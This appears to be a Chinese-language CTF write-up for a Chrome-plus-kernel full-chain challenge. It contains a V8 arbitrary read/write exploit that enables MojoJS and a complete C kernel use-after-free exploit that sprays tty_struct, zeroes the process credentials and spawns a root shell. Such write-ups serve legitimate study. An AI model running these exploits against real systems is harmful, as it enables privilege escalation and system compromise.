// so we can overwrite externel + base_pointer
// to achieve aar and aaw
function i642f(val) {
    u64[0] = val;
    return f64[0];
}

function f2i64(val) {
    f64[0] = val;
    return u64[0];
}

function aar64(addr) {
    backup_high = oob[25];
    backup_low = oob[26];
    save = f2i64(oob[26]) & 0xffffffff00000000n;
    oob[25] = i642f((addr & 0xffffffff00000000n) | 7n); // high
    oob[26] = i642f(save + (((addr - 8n) | 1n) & 0xffffffffn)); // low
    ret = victim_obj[0];
    oob[25] = backup_high;
    oob[26] = backup_low;
    return ret;
}

function aaw64(addr, val) {
    backup_high = oob[25];
    backup_low = oob[26];
    save = f2i64(oob[26]) & 0xffffffff00000000n;
    oob[25] = i642f((addr & 0xffffffff00000000n) | 7n); // high
    oob[26] = i642f(save + (((addr - 8n) | 1n) & 0xffffffffn)); // low
    victim_obj[0] = val;
    oob[25] = backup_high;
    oob[26] = backup_low;
}

let div = document.createElement('div');
let div_addr = high_heap | addrof(div);
console.log(`[+] div address: 0x${div_addr.toString(16)}`);

let addr_HTMLDivElement = aar64(div_addr + 0xcn);
console.log(`[+] HTMLDivElement: 0x${addr_HTMLDivElement.toString(16)}`);

let code_base = addr_HTMLDivElement - 0xc1bb7c0n;
console.log(`[+] codebase: 0x${code_base.toString(16)}`);

let mojo_js_enabled_addr = code_base + 0xc560f0en;
console.log(`[+] mojo_js_enabled: 0x${mojo_js_enabled_addr.toString(16)}`);

aaw64(mojo_js_enabled_addr, 0x1n);

%SystemBreak();
```

在測試環境中可以用 `%SystemBreak()` 下斷點，以下為 debug 時使用的 gdb script。不過麻煩的是，透過測試發現只能用 **xterm** 來 attach 上 render process，**tmux** 與 **gnome-terminal** 都不能用：

```bash
set follow-fork-mode parent
r --no-sandbox --headless --js-flags='--allow-natives-syntax' --renderer-cmd-prefix='xterm -geometry 100x50+10+10 -e gdb --args' --disable-gpu --user-data-dir=./userdata v8_exploit.html
```

不過因為 **xterm** 預設使用的 copy / paste 很難用，因此透過以下 command 可以讓我們使用 `shift` + `ctrl` + `c/v` 做到 copy / paste：

```bash
cat > ~/.Xresources
XTerm*vt100.translations: #override \
    Shift Ctrl <Key> C: copy-selection(CLIPBOARD) \n\
    Shift Ctrl <Key> V: insert-selection(CLIPBOARD)

xrdb -merge ~/.Xresources
```

`nm` 可以看 demangle 後的 C++ symbol，也能用來找 symbol 的 offset：

```bash
nm --demangle ./chrome | grep -i 'is_mojo_js_enabled'
# --demangle: make C++ function more readable
```



**Part2. Sbx**



執行 **chromium** 需要跑的參數：

```python
import subprocess
import tempfile
import sys
import shutil
import os
import base64

os.symlink('/usr/lib/chromium/mojo_bindings', '/tmp/exploit/mojo')

subprocess.check_call(['/usr/lib/chromium/chrome', '--headless', '--disable-gpu',
                       '--remote-debugging-port=9222', '--user-data-dir=/tmp/userdata',
                       '--enable-logging=stderr', 'exploit.html'], cwd='/tmp/exploit')
```

由於我想在 local 環境測試，因此直接執行：

```bash
# gdb script
r --no-sandbox --headless --js-flags='--allow-natives-syntax' --renderer-cmd-prefix='xterm -geometry 100x50+10+10 -e gdb --args' --disable-gpu --user-data-dir=./userdata v8_exploit.html

# command
./chrome -no-sandbox --headless --disable-gpu --enable-logging=stderr --user-data-dir=./userdata v8_exploit.html
```

然而在 ubuntu 20.04 的 local 測試都跑不過 sbx escape 的 payload，原因不明，只能先擱置在旁。



**Part3. kernel exploit**

kernel module 名稱為 `ctf.ko`，source code 大致如下：

```c
struct ctf_data {
  char *mem;
  size_t size;
};
// ...

static const struct file_operations ctf_fops = {
  .owner = THIS_MODULE,
  .open = ctf_open,
  .release = ctf_release,
  .read = ctf_read,
  .write = ctf_write,
  .unlocked_ioctl = ctf_ioctl,
};

// ...

static ssize_t ctf_ioctl(struct file *f, unsigned int cmd, unsigned long arg)
{
  struct ctf_data *data = f->private_data;
  char *mem;

  switch(cmd) {
  case 1337:
    if (arg > 2000) {
      return -EINVAL;
    }

    mem = kmalloc(arg, GFP_KERNEL);
    if (mem == NULL) {
      return -ENOMEM;
    }

    data->mem = mem;
    data->size = arg;
    break;

  case 1338:
    kfree(data->mem);
    break;

  default:
    return -ENOTTY;
  }

  return 0;
}
```

我們可以透過該 kernel module 建立一塊 memory 空間並做讀寫、重新申請與釋放，然而漏洞在於釋放後並沒有清除 `data->mem`，仍可以透過 `read`、`write` 對 freed memory 做讀寫。

因為可以存取 freed memory，因此 leak 十分容易，而問題是該如何透過 UAF 做 exploit。方法應該有許多種：

1. overwrite **/sbin/modprobe**
2. `commit_creds(prepare_kernel_cred(NULL))`
3. overwrite EUID of `cred` structure of the own process

我選擇的是控制 **tty_struct** 配合 **overwrite EUID of `cred` structure of the own process** 來提權，主要是這兩個方法我都不太熟。



由於 `sizeof(struct tty_struct) == 0x2b8`，一開始先建立 `0x2b8` 大小的 chunk 並馬上 free 掉，之後在 spray `struct tty_struct` 時很有可能會拿到我們 free 掉的 chunk，而 `struct tty_struct` 的結構如下：

```c
// https://elixir.bootlin.com/linux/latest/source/include/linux/tty.h#L143
struct tty_struct {
	int	magic;
	struct kref kref;
	struct device *dev;	/* class device or NULL (e.g. ptys, serdev) */
	struct tty_driver *driver;
	const struct tty_operations *ops;
	int index;
	...
```

其中 `*ops` 會指向一個 `struct tty_operations` function table：

```c
// https://elixir.bootlin.com/linux/latest/source/include/linux/tty_driver.h#L247
struct tty_operations {
	struct tty_struct * (*lookup)(struct tty_driver *driver,
			struct file *filp, int idx);
	int  (*install)(struct tty_driver *driver, struct tty_struct *tty);
	void (*remove)(struct tty_driver *driver, struct tty_struct *tty);
	int  (*open)(struct tty_struct * tty, struct file * filp);
	void (*close)(struct tty_struct * tty, struct file * filp);
	void (*shutdown)(struct tty_struct *tty);
	void (*cleanup)(struct tty_struct *tty);
	int  (*write)(struct tty_struct * tty,
		      const unsigned char *buf, int count);
	...
```

因為參數傳遞的關係，我們可以控制 **rsi** 與 **rdx**，而如果我們將使用 function table 蓋掉，讓 function table 指向我們能控制的位置，使得如 `ioctl` 等使用到 **rdi** 與 **rdx** 的 function 會執行如以下 gadget：

```asm
; aar
mov rax, [rdx];
ret;

; aaw
mov [rdx], ecx;
ret;
```

就能做到任意寫與任意讀。不過因為不知道 spray 到的是哪一個 tty，因此所有 spray 的 tty 都需要執行一次，才會跑到我們能控制 `tty_struct` 對應到的 tty，並蓋掉 tty 的 function pointer `ops`。

```c
unsigned long aar32(unsigned long addr)
{
    unsigned long val;

    u64_ptr[46] = kernel_base + mov_rax_prdx_ret;
    write(ctf_fd, chr_ptr, 0x2b8);

    if (target_fd != -1)
        return ioctl(spray[target_fd], 0, addr);

    for (int i = 0; i < 0x100; i++) {
        val = ioctl(spray[i], 0, addr);
        if (val != 0xffffffffffffffff) {
            target_fd = i;
            return val;
        }
    }
    return 0;
}

void aaw32(unsigned long addr, unsigned data)
{
    u64_ptr[46] = kernel_base + mov_prdx_esi;
    write(ctf_fd, chr_ptr, 0x2b8);

    if (target_fd != -1) {
        ioctl(spray[target_fd], data, addr - 0x10);
        return;
    }

    for (int i = 0; i < 0x100; i++)
        write(spray[i], data, addr - 0x10);
}
```

P.S. 嘗試了一下發現 `write` 雖然也能控制 **rsi**、**rdx**，不過猜測在 syscall write 那層會因為 bad address 而被擋下，因此應該只有 `ioctl` 可以被利用。



之後會需要找當前 process 的 `task_struct`，並改對應的 `cred`，在此是透過任意讀 + `prctl(PR_SET_NAME)` 搜尋整個 heap，找到我們所設置的 process name 來取得 `task_struct` 的位址，而 process name 為 `task_struct` 當中的 `name` member，因此能透過 offset 求得 `cred` 的位址。`cred` 為 pointer，指向描述 process credentials 的結構 `struct cred`：

```c
// https://elixir.bootlin.com/linux/latest/source/include/linux/cred.h#L110
struct cred {
	atomic_t	usage;
#ifdef CONFIG_DEBUG_CREDENTIALS
	atomic_t	subscribers;	/* number of processes subscribed */
	void		*put_addr;
	unsigned	magic;
#define CRED_MAGIC	0x43736564
#define CRED_MAGIC_DEAD	0x44656144
#endif
	kuid_t		uid;		/* real UID of the task */
	kgid_t		gid;		/* real GID of the task */
	kuid_t		suid;		/* saved UID of the task */
	kgid_t		sgid;		/* saved GID of the task */
	kuid_t		euid;		/* effective UID of the task */
	kgid_t		egid;		/* effective GID of the task */
	kuid_t		fsuid;		/* UID for VFS ops */
	kgid_t		fsgid;		/* GID for VFS ops */
    ...
```

其中 member Xid 用來描述當前 process 的執行身份。如果我們能夠將這些 value 寫成 0，kernel 就會認為我們當前的執行身份是 root/root，此時 usermode 呼叫 `system("/bin/bash")` 時就會繼承 `cred`，因此擁有 root 的執行權限，做到提權。



Makefile：

```makefile
all:
	musl-gcc -o exp -static ./exp.c
	strip -s ./exp
	mount -o loop ./rootfs.img owo
	cp exp ./owo
	umount owo
```



Exploit：

```c
#include <stdio.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/prctl.h>
#define TTY_MAGIC		0x5401

unsigned long mov_rax_prdx_ret = 0x5efab5; // mov rax, qword ptr [rdx] ; ret
unsigned long mov_prdx_esi = 0x43575b; // mov dword ptr [rdx + 0x10], esi ; ret

int ctf_fd;
char *chr_ptr;
unsigned *u32_ptr;
unsigned long *u64_ptr;
unsigned long file_operations;
unsigned long kernel_base;
unsigned long heap;
int spray[0x100];
int target_fd = -1;

void free_ctfdata()
{
    ioctl(ctf_fd, 1338);
}

void new_ctfdata(unsigned long size)
{
    ioctl(ctf_fd, 1337, size);
}

void perr(const char *msg)
{
    puts(msg);
    if (ctf_fd != -1)
        close(ctf_fd);
    exit(1);
}

void show_u64ptr(unsigned long *ptr, size_t size)
{
    size_t len = size / 8;
    for (int i = 0; i < len; i++)
        printf("[%d\t0x%02x]\t0x%016lx\n", i, i*8, ptr[i]);
}

unsigned long aar32(unsigned long addr)
{
    unsigned long val;

    u64_ptr[46] = kernel_base + mov_rax_prdx_ret;
    write(ctf_fd, chr_ptr, 0x2b8);

    if (target_fd != -1)
        return ioctl(spray[target_fd], 0, addr);

    for (int i = 0; i < 0x100; i++) {
        val = ioctl(spray[i], 0, addr);
        if (val != 0xffffffffffffffff) {
            target_fd = i;
            return val;
        }
    }
    return 0;
}

void aaw32(unsigned long addr, unsigned data)
{
    u64_ptr[46] = kernel_base + mov_prdx_esi;
    write(ctf_fd, chr_ptr, 0x2b8);

    if (target_fd != -1) {
        ioctl(spray[target_fd], data, addr - 0x10);
        return;
    }

    for (int i = 0; i < 0x100; i++)
        write(spray[i], data, addr - 0x10);
}


/* 0xffffffff81000000 _stext
 * 0xffffffffc0000000 ctf.ko
 * sizeof(struct tty_struct) == 0x2b8
 */
int main()
{
    chr_ptr = (char *) malloc(0x1000); u32_ptr = (unsigned *) chr_ptr; u64_ptr = (unsigned long *) chr_ptr;

    ctf_fd = open("/dev/ctf", O_RDWR);
    if (ctf_fd == -1)
        perr("open /dev/ctf failed");

    new_ctfdata(0x2b8);
    free_ctfdata();

    for (int i = 0; i < 0x100; i++)
        spray[i] = open("/dev/ptmx", O_NOCTTY | O_RDONLY);

    // leak kernel addr
    read(ctf_fd, chr_ptr, 0x2b8);
    if (u32_ptr[0] == TTY_MAGIC)
        puts("[+] overlap with tty_struct");
    else
        perr("[-] next time :(");

    show_u64ptr(u64_ptr, 0x2b8);
    file_operations = u64_ptr[3];
    kernel_base = u64_ptr[3] - 0x10745e0;
    heap = u64_ptr[7] - 0x38; // bp in kfree can know
    printf("[+] file_operations: 0x%016lx\n", file_operations);
    printf("[+] kernel_base: 0x%016lx\n", kernel_base);
    printf("[+] heap: 0x%016lx\n", heap);

    // we hijack tty_struct.name (char name[64]) to create our fake_ops
    // ops offset is 3
    // name offset is 45
    // iotcl offset is 12 in file_operations
    u64_ptr[3] = heap + (45-12+1) * 8;
    write(ctf_fd, chr_ptr, 0x2b8);

    char name[4] = {0};
    int rand_fd = open("/dev/urandom", O_RDONLY);
    read(rand_fd, name, 4);
    close(rand_fd);

    prctl(PR_SET_NAME, name);
    unsigned long cred_addr = 0;
    unsigned long task_struct = 0;
    unsigned long start = heap;
    unsigned long end = heap + 0x100000000;

    printf("[*] ioctl --> mov_rax_prdx_ret: 0x%016lx\n", kernel_base + mov_rax_prdx_ret);
    printf("[*] ioctl --> mov_prdx_esi: 0x%016lx\n", kernel_base + mov_prdx_esi);
    for (unsigned long cur = start; cur < end; cur += 0x8) {
        if ((cur & 0xffffff) == 0)
            printf("[*] current: 0x%016lx\n", cur);
        if (aar32(cur) == *(unsigned *)name) {
            task_struct = cur - 0xae8;
            cred_addr = task_struct + 0xad8;
            printf("[+] found task_struct.comm:\t0x%016lx\n", cur);
            printf("[+] found task_struct.cred:\t0x%016lx\n", cred_addr);
            printf("[+] found task_struct:\t0x%016lx\n", task_struct);
            // overwrite Xid
            unsigned long upper = aar32(cred_addr+4) & 0xffffffff;
            unsigned long lower = aar32(cred_addr);
            printf("upper: 0x%016lx, lower: 0x%016lx\n", upper, lower);
            cred_addr = (upper << 32) | lower;
            printf("[+] found cred_addr:\t0x%016lx\n", cred_addr);

            getc(stdin);
            for (int i = 0; i < 8; i++)
                aaw32(cred_addr + (i+1)*4, 0);
            getc(stdin);
            break;
        }
    }
    
    if (cred_addr == 0)
        perr("[-] bad luck"); 

    close(ctf_fd);
    puts("[+] Good job");
    system("/bin/bash");

    return 0;
}
```

P.S. 因為 kernel heap 的結構我們不太能好好掌控，因此在搜尋當前 process 的 `struct task_struct` 有滿高的機率會失敗，個人認為還是寫 `modprobe_path` 比較穩一點，不過就沒有其他方法這麼有趣。



如果要在沒有 symbol 的 kernel 找 `/sbin/modprobe` 的位置：

1. 用 [extract-vmlinux](https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux) 從 bzImage extract 出 vmlinux
2. `strings -n 14 -t x ./vmlinux > output` 得到長度 >= 14 字串的 offset，其中會有 `/sbin/modprobe`
3. `readelf -a ./vmlinux` 找 `.text` 的 offset
4. kernel_base + modprobe_offset_in_file - text_offset 即是 `modprobe_path` 的位址



gdb 當中有以下好用的命令，在做 exploit 時會很有幫助：

```
ptype struct tty_struct # print struct layout
ptype /o struct tty_struct # with offset
```



**Reference**

- https://ptr-yudai.hatenablog.com/entry/2021/07/26/225308
- https://balsn.tw/ctf_writeup/20210717-googlectf2021/#fullchain
- https://ret2.life/posts/Google-CTF-2021
  - 這篇的 sbx escape 打法跟其他隊伍不太一樣，用的是 memory allocation 相關的手法，如果想要更了解 PartitionAllocation 可以參考這篇 writeup
